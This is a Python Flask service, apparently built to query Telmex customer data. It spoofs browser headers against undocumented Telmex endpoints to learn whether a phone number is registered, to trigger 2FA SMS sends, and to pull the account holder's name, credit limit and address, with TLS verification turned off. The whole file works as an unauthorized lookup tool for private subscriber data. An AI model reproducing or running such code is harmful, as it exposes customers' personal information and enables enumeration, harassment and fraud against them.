from flask import Flask, request

import requests
import urllib3

app = Flask(__name__)



@app.route('/registro', methods=['GET'])
def registro_handler():
    telefono = request.args.get('telefono')
    url = 'https://www.online.telmex.com/mitelmex/movil/envia2FA.jsp?t=' + telefono
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        response = requests.get(url, verify=False, timeout=7)
        print(response.text)
        if '"evioCodigo":"NOK"}' in response.text:
            return "💚 SIN REGISTRO MI TELMEX 💚"
        else:
            
            return "🟥 LINEA TELMEX CON REGISTRO 🟥"
        
    except requests.Timeout:
        print('La solicitud HTTP ha excedido el tiempo de espera de 7 segundos.')
        return "🟥 LINEA TELMEX CON REGISTRO 🟥"


def consultarExtras(telefono):
    print ('La dirección IP del cliente es:'+ request.remote_addr)
    url = "https://gfcloud.telmex.com/iafipe/afp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://mitelmex.telmex.com",
        "Referer": "https://mitelmex.telmex.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    }
    payload = {
        "telefono": telefono
    }

    response = requests.post(url, headers=headers, json=payload)
    response_json = response.json()
    responseText = "\n🙎🏿‍♂️Titular: " + response_json['NombreInf'] + "\n📞Credito: " + response_json['limiteCredito']
    return responseText

@app.route('/consultarExtras', methods=['GET'])
def consultar_extras_handler():
    telefono = request.args.get('telefono')
    result = consultarExtras(telefono)
    return result

def direccion(resultado):
    url = "https://gfcomercial.telmex.com/iupsell/condomicilio"

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'es-419,es;q=0.6',
        'Connection': 'keep-alive',
        'Content-Length': '57',
        'Content-Type': 'application/json',
        'Host': 'gfcomercial.telmex.com',
        'Origin': 'https://mitelmex.telmex.com',
        'Referer': 'https://mitelmex.telmex.com/',
        'sec-ch-ua': '"Chromium";v="112", "Brave";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Sec-GPC': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
    }
    print(resultado)
    data = {"strvar": str(resultado)}

    response = requests.post(url, headers=headers, json=data)
    print(response.text)
    return str(response.text)

@app.route('/direccion', methods=['POST'])
def direcciones():
    telefono = request.form.get('resultado')
    result = direccion(telefono)
    return result

if __name__ == '__main__':
    app.run()
